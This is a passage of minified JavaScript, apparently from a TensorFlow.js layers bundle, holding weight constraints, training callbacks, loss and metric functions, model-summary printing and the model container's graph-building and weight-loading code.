            this.axis = null != t.axis ? t.axis : this.defaultAxis
        }
        apply(t) {
            return M((()=>dt(t, Q(le(), Zh(t, this.axis)))))
        }
        getConfig() {
            return {
                axis: this.axis
            }
        }
    }
    E0.className = "UnitNorm",
    _(E0);
    class D0 extends Bi {
        apply(t) {
            return io(t)
        }
    }
    D0.className = "NonNeg",
    _(D0);
    class W0 extends Bi {
        constructor(t) {
            super(),
            this.defaultMinValue = 0,
            this.defaultMaxValue = 1,
            this.defaultRate = 1,
            this.defaultAxis = 0,
            this.minValue = null != t.minValue ? t.minValue : this.defaultMinValue,
            this.maxValue = null != t.maxValue ? t.maxValue : this.defaultMaxValue,
            this.rate = null != t.rate ? t.rate : this.defaultRate,
            this.axis = null != t.axis ? t.axis : this.defaultAxis
        }
        apply(t) {
            return M((()=>{
                const e = Zh(t, this.axis)
                  , s = Q(E(this.rate, nn(e, this.minValue, this.maxValue)), E(1 - this.rate, e));
                return E(t, dt(s, Q(le(), e)))
            }
            ))
        }
        getConfig() {
            return {
                minValue: this.minValue,
                maxValue: this.maxValue,
                rate: this.rate,
                axis: this.axis
            }
        }
    }
    W0.className = "MinMaxNorm",
    _(W0);
    const M0 = {
        maxNorm: "MaxNorm",
        minMaxNorm: "MinMaxNorm",
        nonNeg: "NonNeg",
        unitNorm: "UnitNorm"
    };
    function de(n) {
        return Th(n)
    }
    function V0(n, t={}) {
        return zi(n, mn.getMap().classNameMap, t, "constraint")
    }
    function he(n) {
        if (null == n)
            return null;
        if ("string" == typeof n) {
            return V0({
                className: n in M0 ? M0[n] : n,
                config: {}
            })
        }
        return n instanceof Bi ? n : V0(n)
    }
    async function bo(n) {
        if (null == n)
            return;
        const t = []
          , e = []
          , s = [];
        for (const o in n) {
            const r = n[o];
            if ("number" != typeof r) {
                const i = r;
                t.push(i.data()),
                e.push(o),
                s.push(i)
            }
        }
        if (t.length > 0) {
            const o = await Promise.all(t);
            for (let r = 0; r < o.length; ++r)
                n[e[r]] = o[r][0];
            vt(s)
        }
    }
    function F0(n) {
        if (null != n)
            for (const t in n) {
                const e = n[t];
                "number" != typeof e && e.dispose()
            }
    }
    var z0;
    !function(n) {
        n[n.SILENT = 0] = "SILENT",
        n[n.VERBOSE = 1] = "VERBOSE"
    }(z0 || (z0 = {}));
    class Hi {
        constructor() {
            this.validationData = null
        }
        setParams(t) {
            this.params = t
        }
        async onEpochBegin(t, e) {}
        async onEpochEnd(t, e) {}
        async onBatchBegin(t, e) {}
        async onBatchEnd(t, e) {}
        async onTrainBegin(t) {}
        async onTrainEnd(t) {}
        setModel(t) {}
    }
    class v$ {
        constructor(t, e=10) {
            null == t && (t = []),
            this.callbacks = t,
            this.queueLength = e
        }
        append(t) {
            this.callbacks.push(t)
        }
        setParams(t) {
            for (const e of this.callbacks)
                e.setParams(t)
        }
        setModel(t) {
            for (const e of this.callbacks)
                e.setModel(t)
        }
        async onEpochBegin(t, e) {
            null == e && (e = {});
            for (const s of this.callbacks)
                await s.onEpochBegin(t, e)
        }
        async onEpochEnd(t, e) {
            null == e && (e = {});
            for (const s of this.callbacks)
                await s.onEpochEnd(t, e)
        }
        async onBatchBegin(t, e) {
            null == e && (e = {});
            for (const s of this.callbacks)
                await s.onBatchBegin(t, e)
        }
        async onBatchEnd(t, e) {
            null == e && (e = {});
            for (const s of this.callbacks)
                await s.onBatchEnd(t, e)
        }
        async onTrainBegin(t) {
            null == t && (t = {});
            for (const e of this.callbacks)
                await e.onTrainBegin(t)
        }
        async onTrainEnd(t) {
            null == t && (t = {});
            for (const e of this.callbacks)
                await e.onTrainEnd(t)
        }
    }
    class S$ extends Hi {
        constructor() {
            super()
        }
        async onEpochBegin(t) {
            this.seen = 0,
            this.totals = {}
        }
        async onBatchEnd(t, e) {
            null == e && (e = {});
            const s = null == e.size ? 0 : e.size;
            this.seen += s;
            for (const o in e) {
                const r = e[o];
                if ("number" == typeof r)
                    this.totals.hasOwnProperty(o) || (this.totals[o] = 0),
                    this.totals[o] = this.totals[o] + r * s;
                else {
                    let i;
                    o in this.totals ? i = this.totals[o] : this.totals[o] = 0;
                    const a = M((()=>Q(this.totals[o], E(r, s))));
                    this.totals[o] = a,
                    null != i && i.dispose()
                }
            }
        }
        async onEpochEnd(t, e) {
            if (null != e)
                for (const s of this.params.metrics)
                    null != this.totals[s] && ("number" == typeof this.totals[s] ? e[s] = this.totals[s] / this.seen : M((()=>{
                        const o = E(dt(1, this.seen), this.totals[s]);
                        e[s] = o,
                        this.totals[s].dispose(),
                        en(e[s])
                    }
                    )))
        }
    }
    class k$ extends Hi {
        async onTrainBegin(t) {
            this.epoch = [],
            this.history = {}
        }
        async onEpochEnd(t, e) {
            null == e && (e = {}),
            this.epoch.push(t);
            for (const s in e)
                null == this.history[s] && (this.history[s] = []),
                this.history[s].push(e[s])
        }
        async syncData() {
            const t = []
              , e = []
              , s = [];
            for (const r in this.history) {
                const i = this.history[r];
                for (let a = 0; a < i.length; ++a)
                    if ("number" != typeof i[a]) {
                        const c = i[a];
                        t.push(c.data()),
                        e.push(r),
                        s.push(a)
                    }
            }
            const o = await Promise.all(t);
            for (let r = 0; r < o.length; ++r)
                this.history[e[r]][s[r]].dispose(),
                this.history[e[r]][s[r]] = o[r][0]
        }
    }
    class T$ extends Hi {
        constructor(t, e) {
            if (super(),
            this.currentEpoch = 0,
            this.nowFunc = t.nowFunc,
            this.nextFrameFunc = t.nextFrameFunc || Xc,
            this.yieldEvery = e || "auto",
            "auto" === this.yieldEvery && (this.yieldEvery = 125),
            "never" === this.yieldEvery && null != t.onYield)
                throw new Error("yieldEvery is `never` but you provided an `onYield` callback. Either change `yieldEvery` or remove the callback");
            Yl(this.yieldEvery) && (this.maybeWait = function AR(n, t, e) {
                let o, s = null != e ? e() : Ve();
                return (...i)=>{
                    const a = null != e ? e() : Ve();
                    return a - s < t || (s = a,
                    o = n(...i)),
                    o
                }
            }(this.maybeWait.bind(this), this.yieldEvery, this.nowFunc)),
            this.trainBegin = t.onTrainBegin,
            this.trainEnd = t.onTrainEnd,
            this.epochBegin = t.onEpochBegin,
            this.epochEnd = t.onEpochEnd,
            this.batchBegin = t.onBatchBegin,
            this.batchEnd = t.onBatchEnd,
            this.yield = t.onYield
        }
        async maybeWait(t, e, s) {
            const o = [];
            null != this.yield && (await bo(s),
            o.push(this.yield(t, e, s))),
            o.push(this.nextFrameFunc()),
            await Promise.all(o)
        }
        async onEpochBegin(t, e) {
            this.currentEpoch = t,
            null != this.epochBegin && (await bo(e),
            await this.epochBegin(t, e))
        }
        async onEpochEnd(t, e) {
            const s = [];
            null != this.epochEnd && (await bo(e),
            s.push(this.epochEnd(t, e))),
            "epoch" === this.yieldEvery && s.push(this.nextFrameFunc()),
            await Promise.all(s)
        }
        async onBatchBegin(t, e) {
            null != this.batchBegin && (await bo(e),
            await this.batchBegin(t, e))
        }
        async onBatchEnd(t, e) {
            const s = [];
            null != this.batchEnd && (await bo(e),
            s.push(this.batchEnd(t, e))),
            "batch" === this.yieldEvery ? s.push(this.nextFrameFunc()) : Yl(this.yieldEvery) && s.push(this.maybeWait(this.currentEpoch, t, e)),
            await Promise.all(s)
        }
        async onTrainBegin(t) {
            null != this.trainBegin && (await bo(t),
            await this.trainBegin(t))
        }
        async onTrainEnd(t) {
            null != this.trainEnd && (await bo(t),
            await this.trainEnd(t))
        }
    }
    function X0(n, t) {
        return null == n && (n = {}),
        n instanceof Hi ? [n] : Array.isArray(n) && n[0]instanceof Hi ? n : Lt(n).map((s=>new T$(s,t)))
    }
    class yn {
        constructor() {}
        static registerCallbackConstructor(t, e) {
            v(t >= 0 && Number.isInteger(t), (()=>`Verbosity level is expected to be an integer >= 0, but got ${t}`)),
            yn.checkForDuplicate(e),
            null == yn.constructors[t] && (yn.constructors[t] = []),
            yn.constructors[t].push(e)
        }
        static checkForDuplicate(t) {
            for (const e in yn.constructors)
                yn.constructors[+e].forEach((o=>{
                    if (o === t)
                        throw new $("Duplicate callback constructor.")
                }
                ))
        }
        static clear() {
            yn.constructors = {}
        }
        static createCallbacks(t) {
            const e = [];
            for (const s in yn.constructors) {
                const o = +s;
                t >= o && e.push(...yn.constructors[o])
            }
            return e.map((s=>new s))
        }
    }
    function A0(n, t, e, s, o, r, i, a, c) {
        const l = new k$
          , u = [new S$, ...yn.createCallbacks(t)];
        null != n && u.push(...n),
        u.push(l);
        const d = new v$(u);
        return d.setParams({
            epochs: e,
            initialEpoch: s,
            samples: o,
            steps: r,
            batchSize: i,
            verbose: t,
            doValidation: a,
            metrics: c
        }),
        {
            callbackList: d,
            history: l
        }
    }
    function us(n, t={}, e=!1) {
        return zi(n, mn.getMap().classNameMap, t, "layer", e)
    }
    function qc(n, t) {
        return M((()=>{
            "float32" !== n.dtype && (n = st(n, "float32"));
            const e = ut(Pi(n), t, !0)
              , s = $c(e.shape, le())
              , o = Ee(vs(e, s));
            return dt(n, o)
        }
        ))
    }
    function tl(n, t) {
        return M((()=>ie(Pi(pt(t, n)), -1)))
    }
    function Bh(n, t) {
        return M((()=>ie(Ge(pt(t, n)), -1)))
    }
    function Hh(n, t) {
        return M((()=>{
            const e = pt(n, t)
              , s = nn(Ge(n), le(), Number.MAX_VALUE)
              , o = Ge(dt(e, s));
            return E(100, ie(o, -1))
        }
        ))
    }
    function _i(n, t, e=!1) {
        return M((()=>{
            if (e)
                t = zd(t);
            else {
                const s = ut(t, t.shape.length - 1, !0);
                t = dt(t, s)
            }
            return t = nn(t, le(), 1 - le()),
            ne(ut(E(st(n, "float32"), Pn(t)), t.shape.length - 1))
        }
        ))
    }
    function el(n, t, e=!1) {
        return M((()=>{
            const s = st(Dc(function jR(n) {
                const t = [Ns(n.shape)];
                return W(n, t)
            }(n)), "int32")
              , o = (t = nn(t, le(), 1 - le())).shape;
            return _i(W(Zm(s, o[o.length - 1]), o), t, e)
        }
        ))
    }
    function nl(n, t) {
        return M((()=>{
            let e;
            return e = nn(t, le(), 1 - le()),
            e = Pn(dt(e, pt(1, e))),
            ie(function E$(n, t) {
                if (!Rt(n.shape, t.shape))
                    throw new $(`logits and labels must have the same shape, but got shapes ${JSON.stringify(n.shape)} and ${JSON.stringify(t.shape)}`);
                return M((()=>{
                    const e = io(t)
                      , s = ne(Ge(t));
                    return Q(pt(e, E(t, n)), Am(An(s)))
                }
                ))
            }(n, e), -1)
        }
        ))
    }
    function P0(n, t) {
        return M((()=>{
            const e = qc(n, -1)
              , s = qc(t, -1)
              , o = E(e, s);
            return ne(ut(o, -1))
        }
        ))
    }
    yn.constructors = {};
    const sl = {
        meanSquaredError: tl,
        meanAbsoluteError: Bh,
        meanAbsolutePercentageError: Hh,
        meanSquaredLogarithmicError: function N$(n, t) {
            return M((()=>{
                const e = nn(t, le(), Number.MAX_VALUE)
                  , s = Pn(Q(1, e))
                  , o = nn(n, le(), Number.MAX_VALUE)
                  , r = Pn(Q(1, o));
                return ie(Pi(pt(s, r)), -1)
            }
            ))
        },
        squaredHinge: function R$(n, t) {
            return M((()=>{
                const e = vs(0, pt(1, E(n, t)));
                return ie(Pi(e), -1)
            }
            ))
        },
        hinge: function $$(n, t) {
            return M((()=>{
                const e = vs(0, pt(1, E(n, t)));
                return ie(e, -1)
            }
            ))
        },
        categoricalHinge: function G$(n, t) {
            return M((()=>{
                const e = ut(E(n, t), -1)
                  , s = Tn(E(pt(1, n), t), -1);
                return vs(0, Q(1, pt(s, e)))
            }
            ))
        },
        logcosh: function L$(n, t) {
            return M((()=>{
                const e = Math.log(2)
                  , s = pt(t, n)
                  , o = pt(Q(s, $i(E(-2, s))), e);
                return ie(o, -1)
            }
            ))
        },
        categoricalCrossentropy: _i,
        sparseCategoricalCrossentropy: el,
        binaryCrossentropy: nl,
        kullbackLeiblerDivergence: function D$(n, t) {
            return M((()=>{
                const e = nn(n, le(), 1)
                  , s = nn(t, le(), 1);
                return ut(E(n, Pn(dt(e, s))), -1)
            }
            ))
        },
        poisson: function W$(n, t) {
            return M((()=>{
                const e = Pn(Q(le(), t));
                return ie(pt(t, E(n, e)), -1)
            }
            ))
        },
        cosineProximity: P0
    };
    function _h(n) {
        if ("string" == typeof n) {
            if (n in sl)
                return sl[n];
            let t = `Unknown loss ${n}`;
            throw n.toLowerCase().includes("softmaxcrossentropy") && (t = `Unknown loss ${n}. Use "categoricalCrossentropy" as the string name for tf.losses.softmaxCrossEntropy`),
            new $(t)
        }
        return n
    }
    function O0(n, t) {
        return M((()=>{
            const e = E(.5, fn(t))
              , s = Hn(sn(t, e), n.dtype);
            return ie(Xn(n, s), -1)
        }
        ))
    }
    function K0(n, t) {
        return M((()=>Hn(Xn(vi(n, -1), vi(t, -1)), "float32")))
    }
    function z$(n, t) {
        return nl(n, t)
    }
    function X$(n, t) {
        return n.rank === t.rank && (n = Di(n, [n.rank - 1])),
        (t = vi(t, -1)).dtype !== n.dtype && (t = st(t, n.dtype)),
        st(Xn(n, t), "float32")
    }
    const Z0 = _i
      , B0 = el
      , ol = {
        binaryAccuracy: O0,
        categoricalAccuracy: K0,
        precision: function F$(n, t) {
            return M((()=>{
                const e = function M$(n, t) {
                    return M((()=>st(ut(rs(Xn(n, 1), Xn(t, 1))), "float32")))
                }(n, t)
                  , s = function V$(n, t) {
                    return M((()=>st(ut(rs(Xn(n, 0), Xn(t, 1))), "float32")))
                }(n, t)
                  , o = Q(e, s);
                return st(Le(sn(o, 0), dt(e, o), 0), "float32")
            }
            ))
        },
        categoricalCrossentropy: Z0,
        sparseCategoricalCrossentropy: B0,
        mse: tl,
        MSE: tl,
        mae: Bh,
        MAE: Bh,
        mape: Hh,
        MAPE: Hh,
        cosine: P0
    };
    function _$(n) {
        if ("string" == typeof n && n in ol)
            return ol[n];
        if ("string" != typeof n && null != n)
            return n;
        throw new $(`Unknown metric ${n}`)
    }
    function rl(n) {
        if (Bn(null !== n, `Unknown LossOrMetricFn ${n}`),
        "string" == typeof n)
            return n;
        {
            let t;
            for (const e of Object.keys(sl))
                if (sl[e] === n) {
                    t = e;
                    break
                }
            if (void 0 !== t)
                return t;
            for (const e of Object.keys(ol))
                if (ol[e] === n) {
                    t = e;
                    break
                }
            return void 0 !== t ? t : n.name
        }
    }
    function _0(n, t, e=!1) {
        if (null == n || "object" != typeof n || Object.getPrototypeOf(n) !== Object.prototype || !Uh(n))
            throw new Error("User-defined metadata is expected to be a JSON object, but is not.");
        if (e) {
            const s = JSON.stringify(n);
            s.length > 1048576 && console.warn(`User-defined metadata of model "${t}" is too large in size (length=${s.length} when serialized). It is not recommended to store such large objects in user-defined metadata. Please make sure its serialized length is <= 1048576.`)
        }
    }
    function Uh(n) {
        if (null === n)
            return !0;
        if ("object" == typeof n) {
            if (Object.getPrototypeOf(n) === Object.prototype) {
                const t = Object.keys(n);
                for (const e of t)
                    if ("string" != typeof e || !Uh(n[e]))
                        return !1;
                return !0
            }
            if (Array.isArray(n)) {
                for (const t of n)
                    if (!Uh(t))
                        return !1;
                return !0
            }
            return !1
        }
        {
            const t = typeof n;
            return "string" === t || "number" === t || "boolean" === t
        }
    }
    function Y$(n, t, e, s=console.log) {
        const o = function J$(n) {
            let t = !0;
            const e = []
              , s = [];
            for (const o in n.nodesByDepth)
                e.push(n.nodesByDepth[o]);
            for (const o of e) {
                if (o.length > 1 || 1 === o.length && o[0].inboundLayers.length > 1) {
                    t = !1;
                    break
                }
                s.push(...o)
            }
            if (t)
                for (const o of n.layers) {
                    let r = !1;
                    for (const i of o.inboundNodes)
                        if (-1 !== s.indexOf(i)) {
                            if (r) {
                                t = !1;
                                break
                            }
                            r = !0
                        }
                    if (!t)
                        break
                }
            return t
        }(n)
          , r = ["Layer (type)", "Input Shape", "Output shape", "Param #"];
        let i;
        if (o ? (t = t || 90,
        e = e || [.32, .61, .89, 1]) : (t = t || 115,
        e = e || [.24, .48, .7, .8, 1]),
        e[e.length - 1] <= 1 && (e = e.map((u=>Math.floor(t * u)))),
        !o) {
            r.push("Receives inputs"),
            i = [];
            for (const u in n.nodesByDepth)
                i.push(...n.nodesByDepth[u])
        }
        s("_".repeat(t)),
        il(r, e, s),
        s("=".repeat(t));
        const a = n.layers;
        for (let u = 0; u < a.length; ++u)
            o ? j$(a[u], e, s) : q$(a[u], e, i, s),
            s((u === a.length - 1 ? "=" : "_").repeat(t));
        n.checkTrainableWeightsConsistency();
        const c = function Q$(n) {
            let t;
            return t = null != n.collectedTrainableWeights ? Yc(n.collectedTrainableWeights) : Yc(n.trainableWeights),
            t
        }(n)
          , l = Yc(n.nonTrainableWeights);
        s(`Total params: ${c + l}`),
        s(`Trainable params: ${c}`),
        s(`Non-trainable params: ${l}`),
        s("_".repeat(t))
    }
    function il(n, t, e=console.log) {
        let s = "";
        for (let o = 0; o < n.length; ++o)
            o > 0 && (s = s.slice(0, s.length - 1) + " "),
            s += n[o],
            s = s.slice(0, t[o]),
            s += " ".repeat(t[o] - s.length);
        e(s)
    }
    function j$(n, t, e) {
        let s, o;
        try {
            o = n.inboundNodes.map((c=>JSON.stringify(c.inputShapes))).join(",")
        } catch {
            o = "multiple"
        }
        try {
            s = JSON.stringify(n.outputShape)
        } catch {
            s = "multiple"
        }
        il([`${n.name} (${n.getClassName()})`, o, s, n.countParams().toString()], t, e)
    }
    function q$(n, t, e, s) {
        let o, r;
        try {
            r = n.inboundNodes.map((d=>JSON.stringify(d.inputShapes))).join(",")
        } catch {
            r = "multiple"
        }
        try {
            o = JSON.stringify(n.outputShape)
        } catch {
            o = "multiple"
        }
        const i = [];
        for (const d of n.inboundNodes)
            if (!(null != e && e.length > 0 && -1 === e.indexOf(d)))
                for (let h = 0; h < d.inboundLayers.length; ++h) {
                    const p = d.inboundLayers[h].name
                      , f = d.nodeIndices[h]
                      , m = d.tensorIndices[h];
                    i.push(`${p}[${f}][${m}]`)
                }
        const a = n.name
          , c = n.getClassName()
          , l = 0 === i.length ? "" : i[0];
        il([`${a} (${c})`, r, o, n.countParams().toString(), l], t, s);
        for (let d = 1; d < i.length; ++d)
            il(["", "", "", "", i[d]], t, s)
    }
    function U0(n, t, e) {
        return ("inboundNodes" === n || "outputLayers" === n || "inputLayers" === n) && 0 === t && "string" == typeof e
    }
    function Yh(n, t) {
        if (null === n)
            return null;
        if ("string" == typeof n)
            return po(n);
        if ("number" == typeof n || "boolean" == typeof n)
            return n;
        if (n instanceof Array) {
            const e = []
              , s = n.length;
            for (let o = 0; o < s; ++o) {
                const r = n[o];
                U0(t, o, r) ? e.push(r) : e.push(Yh(r, t))
            }
            return e
        }
        {
            const e = {};
            for (const s of Object.keys(n)) {
                const o = n[s];
                if ("name" === s && "string" == typeof o)
                    e[s] = o;
                else {
                    const r = po(s);
                    e[r] = Yh(o, r)
                }
            }
            return e
        }
    }
    function Qh(n, t) {
        if (null == n)
            return null;
        if ("string" == typeof n)
            return ls(n);
        if ("number" == typeof n || "boolean" == typeof n)
            return n;
        if (n instanceof Array) {
            const e = []
              , s = n.length;
            for (let o = 0; o < s; ++o) {
                const r = n[o];
                U0(t, o, r) ? e.push(r) : e.push(Qh(r, t))
            }
            return e
        }
        {
            const e = {};
            for (const s of Object.keys(n)) {
                const o = n[s]
                  , r = ls(s);
                e[r] = "name" !== s && "className" !== s || "string" != typeof o ? Qh(o, s) : o
            }
            return e
        }
    }
    class En extends Ct {
        constructor(t) {
            if (super({}),
            this.containerNodes = new Set,
            this.name = t.name,
            null == this.name) {
                const x = this.getClassName().toLowerCase();
                this.name = Bc(x)
            }
            if (this.supportsMasking = !1,
            this.trainable_ = !0,
            Array.isArray(t.inputs) ? this.inputs = t.inputs.slice() : this.inputs = [t.inputs],
            Array.isArray(t.outputs) ? this.outputs = t.outputs.slice() : this.outputs = [t.outputs],
            Ts(this.inputs).length !== this.inputs.length)
                throw new $(`The list of inputs passed to the model is redundant. All inputs should only appear once. Found: ${this.inputs.map((x=>x.name))}`);
            Ts(this.outputs).length !== this.outputs.length && console.warn(`The list of outputs passed to the model is redundant. All outputs should only appear once. Found: ${this.outputs.map((x=>x.name))}`),
            this.inputLayers = [],
            this.inputLayersNodeIndices = [],
            this.inputLayersTensorIndices = [],
            this.outputLayers = [],
            this.outputLayersNodeIndices = [],
            this.outputLayersTensorIndices = [],
            this.layers = [],
            this.internalContainerRefs = [];
            for (const x of this.outputs) {
                const I = x.sourceLayer
                  , y = x.nodeIndex
                  , w = x.tensorIndex;
                this.outputLayers.push(I),
                this.outputLayersNodeIndices.push(y),
                this.outputLayersTensorIndices.push(w)
            }
            for (const x of this.inputs) {
                const I = x.sourceLayer
                  , y = x.nodeIndex
                  , w = x.tensorIndex;
                Bn(0 === y, "input layer has >1 nodes"),
                Bn(0 === w, "input layer has >1 tensors"),
                this.inputLayers.push(I),
                this.inputLayersNodeIndices.push(y),
                this.inputLayersTensorIndices.push(w)
            }
            this.inputNames = [],
            this.outputNames = [],
            this.feedInputShapes = [],
            this.feedInputNames = [],
            this.feedOutputNames = [];
            for (let x = 0; x < this.inputLayers.length; x++) {
                const I = this.inputLayers[x];
                if (!(I instanceof Ki))
                    throw new TypeError(`Input layers to a LayersModel must be InputLayer objects. Received inputs: ${t.inputs}. Input ${x} (0-based) originates from layer type ${I.getClassName()}.`);
                this.inputNames.push(I.name),
                this.feedInputShapes.push(I.batchInputShape),
                this.feedInputNames.push(I.name)
            }
            for (const x of this.outputLayers)
                this.outputNames.push(x.name);
            this.internalInputShapes = this.inputs.map((x=>x.shape)),
            this.internalOutputShapes = this.outputs.map((x=>x.shape));
            const e = {}
              , s = {}
              , o = {}
              , r = {}
              , i = {}
              , a = []
              , c = (x,I,y,w,C,k)=>{
                (null == w || null == C || null == k) && (w = x.sourceLayer,
                C = x.nodeIndex,
                k = x.tensorIndex);
                const S = w.inboundNodes[C];
                if (-1 !== y.indexOf(S))
                    throw new gn(`The tensor ${x.name} at layer "${w.name}" is part of a cycle.`);
                if (-1 !== I.indexOf(S))
                    return;
                this.containerNodes.add(En.nodeKey(w, C)),
                w.id in i || (i[w.id] = Object.keys(i).length),
                -1 === y.indexOf(S) && y.push(S);
                const T = S.inboundLayers.length;
                for (let R = 0; R < T; R++) {
                    const L = S.inputTensors[R]
                      , V = S.inboundLayers[R]
                      , F = S.nodeIndices[R]
                      , X = S.tensorIndices[R];
                    c(L, I, y, V, F, X)
                }
                for (I.push(S); y.indexOf(S) >= 0; )
                    y.splice(y.indexOf(S), 1);
                a.push(S)
            }
              , l = []
              , u = [];
            for (const x of this.outputs)
                c(x, l, u);
            const d = a.slice().reverse();
            for (const x of d) {
                s[x.id] = x,
                x.id in e || (e[x.id] = 0);
                let I = e[x.id];
                const y = null == o[x.outboundLayer.id] ? 0 : o[x.outboundLayer.id];
                I = Math.max(I, y),
                o[x.outboundLayer.id] = I,
                r[x.outboundLayer.id] = x.outboundLayer,
                e[x.id] = I;
                for (let w = 0; w < x.inboundLayers.length; w++) {
                    const C = x.inboundLayers[w]
                      , k = x.nodeIndices[w]
                      , S = C.inboundNodes[k]
                      , T = null == e[S.id] ? 0 : e[S.id];
                    e[S.id] = Math.max(I + 1, T),
                    s[S.id] = S
                }
            }
            const h = {};
            for (const x in e) {
                const I = e[x];
                I in h || (h[I] = []),
                h[I].push(s[x])
            }
            const p = {};
            for (const x in o) {
                const I = o[x];
                I in p || (p[I] = []),
                p[I].push(r[x])
            }
            let f = Object.keys(p).map((x=>parseInt(x, 10))).sort(Kc);
            this.layers = [];
            for (const x of f) {
                const I = p[x];
                I.sort(((y,w)=>{
                    const C = i[y.id]
                      , k = i[w.id];
                    return C < k ? -1 : C > k ? 1 : 0
                }
                ));
                for (const y of I)
                    y instanceof En && this.internalContainerRefs.push(y),
                    this.layers.push(y)
            }
            this.layersByDepth = p,
            f = Object.keys(h).map((x=>parseInt(x, 10))).sort(Kc);
            const m = this.inputs.slice()
              , g = [];
            for (const x of f)
                for (const I of h[x]) {
                    const y = I.outboundLayer;
                    if (null != y) {
                        for (const w of I.inputTensors)
                            if (-1 === m.indexOf(w))
                                throw new gn(`Graph disconnected: cannot obtain value for tensor ${w} at layer "${y.name}". The following previous layers were accessed without issue: ${g}`);
                        for (const w of I.outputTensors)
                            m.push(w);
                        g.push(y.name)
                    }
                }
            this.nodesByDepth = h;
            const b = this.layers.map((x=>x.name));
            for (const x of b) {
                const I = b.filter((y=>y === x)).length;
                if (1 !== I)
                    throw new gn(`The name "${x}" is used ${I} times in the model. All layer names should be unique. Layer names: ` + JSON.stringify(b))
            }
            this.outboundNodes = [],
            this.inboundNodes = [],
            new Qc({
                outboundLayer: this,
                inboundLayers: [],
                nodeIndices: [],
                tensorIndices: [],
                inputTensors: this.inputs,
                outputTensors: this.outputs,
                inputMasks: this.inputs.map((x=>null)),
                outputMasks: this.outputs.map((x=>null)),
                inputShapes: this.inputs.map((x=>x.shape)),
                outputShapes: this.outputs.map((x=>x.shape))
            }),
            this.built = !0,
            this._refCount = 1
        }
        assertNotDisposed() {
            if (0 === this._refCount)
                throw new Error(`Container '${this.name}' is already disposed.`)
        }
        dispose() {
            this.assertNotDisposed();
            const t = {
                refCountAfterDispose: null,
                numDisposedVariables: 0
            };
            if (0 == --this._refCount) {
                for (const e of this.layers)
                    t.numDisposedVariables += e.dispose().numDisposedVariables;
                for (const e of this.internalContainerRefs)
                    t.numDisposedVariables += e.dispose().numDisposedVariables
            }
            return t.refCountAfterDispose = this._refCount,
            t
        }
        get trainable() {
            return this.trainable_
        }
        set trainable(t) {
            this.layers.forEach((e=>{
                e._trainableWeights.forEach((s=>s.trainable = t))
            }
            )),
            this.trainable_ = t
        }
        get trainableWeights() {
            if (this._trainableWeights.length > 0)
                throw new $("Container instance unexpectedly contains _trainableWeights.The trainable weights of a Container are a union of the trainable weights of its consituent Layers. Its own _trainableWeights must remain an empty Array.");
            if (!this.trainable)
                return [];
            let t = [];
            for (const e of this.layers)
                t = t.concat(e.trainableWeights);
            return t
        }
        get nonTrainableWeights() {
            const t = [];
            for (const e of this.layers)
                t.push(...e.nonTrainableWeights);
            if (!this.trainable) {
                const e = [];
                for (const s of this.layers)
                    e.push(...s.trainableWeights);
                return e.concat(t)
            }
            return t
        }
        get weights() {
            return this.trainableWeights.concat(this.nonTrainableWeights)
        }
        loadWeights(t, e=!0) {
            const s = {};
            let o = 0;
            const r = (n=>{
                const t = Object.keys(n);
                if (0 === t.length)
                    return !1;
                const e = t[0].split("/");
                return !isNaN(parseInt(e[e.length - 1], 10))
            }
            )(t);
            r && this.parseWeights(t);
            for (const a of this.layers)
                for (const [c,l] of a.weights.entries()) {
                    const u = r ? `${l.name.split("/").slice(0, -1).join("/") + "/"}${c}` : l.originalName;
                    if (null != s[u])
                        throw new $(`Duplicate weight name: ${u}`);
                    s[u] = l,
                    o++
                }
            const i = [];
            for (const a in t) {
                let c = a;
                if (null == s[a]) {
                    const l = a.split("/");
                    c = l.slice(0, -2).concat([l[l.length - 1]]).join("/")
                }
                if (null != s[c])
                    i.push([s[c], t[a]]);
                else if (e)
                    throw new $(`Provided weight data has no target variable: ${a}`);
                delete s[c]
            }
            if (e) {
                const a = [];
                for (const c in s)
                    a.push(c);
                if (a.length > 0)
                    throw new $(`${a.length} of ${o} weights are not set: ${a}`)
            }
            Kh(i)
        }
        parseWeights(t) {
            for (const e in Object.keys(t)) {
                const s = e.split("/")
                  , o = ["vars", "layer_checkpoint_dependencies"]
                  , r = s.map((i=>i.startsWith("_") ? i.slice(1) : i)).filter((i=>!o.includes(i))).join("/");
                r !== e && (t[r] = t[e],
                delete t[e])
            }
        }
        updatedConfig() {
            const t = this.getConfig()
              , e = {};
            return e.className = this.getClassName(),
            e.config = t,
            e.kerasVersion = "tfjs-layers 4.16.0",
            e.backend = "TensorFlow.js",
            e
        }
        toJSON(t, e=!0) {
            const s = Qh(this.updatedConfig());
            return e ? JSON.stringify(s) : s
        }
        call(t, e) {
            return M((()=>{
                t = Lt(t);
                const s = new $s;
                for (let o = 0; o < this.inputs.length; ++o)
                    s.add(this.inputs[o], t[o]);
                return Zi(this.outputs, s, e)
            }
            ))
        }
        computeMask(t, e) {
            return M((()=>{
                let s;
                return t = Lt(t),
                s = null == e ? ho(null, t.length) : Lt(e),
                this.runInternalGraph(t, s)[1]
            }
            ))
        }
        computeOutputShape(t) {
            const e = Uc(t);
            if (e.length !== this.inputLayers.length)
                throw new $(`Invalid inputShape argument ${t}: model has ${this.inputLayers.length} tensor inputs.`);
            const s = {};
            for (let a = 0; a < e.length; a++) {
                const c = this.inputLayers[a]
                  , l = e[a];
                s[c.name + "_0_0"] = l
            }
            const o = Object.keys(this.nodesByDepth).map((a=>parseInt(a, 10))).sort(Kc);
            if (o.length > 1)
                for (const a of o) {
                    const c = this.nodesByDepth[a];
                    for (const l of c) {
                        const u = l.outboundLayer;
                        if (-1 !== this.inputLayers.map((m=>m.id)).indexOf(u.id))
                            continue;
                        const d = [];
                        for (let m = 0; m < l.inboundLayers.length; m++) {
                            const g = l.inboundLayers[m]
                              , b = l.nodeIndices[m]
                              , x = l.tensorIndices[m]
                              , y = s[`${g.name}_${b}_${x}`];
                            d.push(y)
                        }
                        const p = Uc(u.computeOutputShape(Pe(d)))
                          , f = u.inboundNodes.indexOf(l);
                        for (let m = 0; m < p.length; m++) {
                            s[`${u.name}_${f}_${m}`] = p[m]
                        }
                    }
                }
            const r = []
              , i = [];
            for (let a = 0; a < this.outputLayers.length; a++) {
                const c = this.outputLayers[a]
                  , l = this.outputLayersNodeIndices[a]
                  , u = this.outputLayersTensorIndices[a]
                  , d = `${c.name}_${l}_${u}`;
                i.push(d)
            }
            for (let a = 0; a < i.length; a++) {
                const c = i[a];
                Bn(c in s),
                r.push(s[c])
            }
            return Pe(r)
        }
        runInternalGraph(t, e) {
            null == e && (e = ho(null, t.length));
            const s = {};
